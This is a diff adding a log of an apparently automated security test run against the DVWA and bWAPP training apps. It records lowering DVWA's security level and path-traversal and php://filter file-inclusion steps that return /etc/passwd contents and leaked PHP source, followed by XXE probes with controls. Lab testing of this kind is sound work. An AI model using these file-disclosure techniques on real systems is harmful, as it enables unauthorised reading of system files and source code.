@@ -1,0 +1,22 @@
+﻿--- dvwa_get_login: {"status": 200, "token_len": 32, "bytes": 1342}
+--- dvwa_post_login: {"status": 302, "location": "index.php"}
+--- dvwa_index: {"status": 200, "logged_in": true, "phpssid": "9281e717a5870fd1d552ba2e27b7c68b"}
+--- dvwa_security_page: {"status": 200, "token_present": true, "cur": ["impossible"]}
+--- dvwa_set_security_low: {"status": 302}
+--- dvwa_security_after: {"status": 200, "level_hint": ["low"]}
+--- b1_baseline_include: {"status": 200, "bytes": 5322, "has_root": false, "has_daemon": false, "echoed_payload": true, "head": "<!DOCTYPE html>  <html lang=\"en-GB\">  \t<head> \t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />  \t\t<title>Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA)<"}
+--- b1_traversal_etc_passwd: {"status": 200, "bytes": 6936, "has_root": true, "has_daemon": true, "echoed_payload": false, "head": "root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:"}
+--- b1_traversal_negative_control: {"status": 200, "bytes": 3680, "has_root": false, "has_daemon": false, "echoed_payload": false, "head": "<!DOCTYPE html>  <html lang=\"en-GB\">  \t<head> \t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />  \t\t<title>Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA)<"}
+--- b1_phpfilter_src_index: {"status": 200, "bytes": 5008, "has_root": false, "has_daemon": false, "echoed_payload": false, "head": "PD9waHANCg0KZGVmaW5lKCAnRFZXQV9XRUJfUEFHRV9UT19ST09UJywgJy4uLy4uLycgKTsNCnJlcXVpcmVfb25jZSBEVldBX1dFQl9QQUdFX1RPX1JPT1QgLiAnZHZ3YS9pbmNsdWRlcy9kdndhUGFnZS5pbmMucGhwJzsNCg0KZHZ3YVBhZ2VTdGFydHVwKCBhcnJh"}
+--- b1_phpfilter_decoded: {"decoded_len": 995, "is_php": true, "sample": "<?php\r \r define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );\r require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc."}
+--- b1_phpfilter_passwd: {"has_root": true, "sample": "root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bi"}
+--- b1_absolute_path: {"status": 200, "bytes": 6936, "has_root": true, "has_daemon": true, "echoed_payload": false, "head": "root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:"}
+--- bwapp_login: {"status": 302, "location": "portal.php", "phpssid": "5f7ec67b0053f61c45d6190699a872e6", "seclev_cookie": "0"}
+--- bwapp_portal: {"status": 200, "is_portal": true}
+--- bwapp_xxe1_exists: {"status": 200, "is_xxe_page": true, "bytes": 13422}
+--- b2_internal_entity_probe_low: {"status": 200, "resp": "nonexistent_loop3's secret has been reset!", "seclev_cookie": "0"}
+--- b2_file_entity_probe_low: {"status": 200, "resp": "nonexistent_loop3's secret has been reset!", "seclev_cookie": "0"}
+--- b2_file_entity_missing_control_low: {"status": 200, "resp": "nonexistent_loop3's secret has been reset!", "seclev_cookie": "0"}
+{"rc": "ok", "steps": 19}
+{"rc": 0, "stdout_len": 3138, "stderr_len": 0}
+
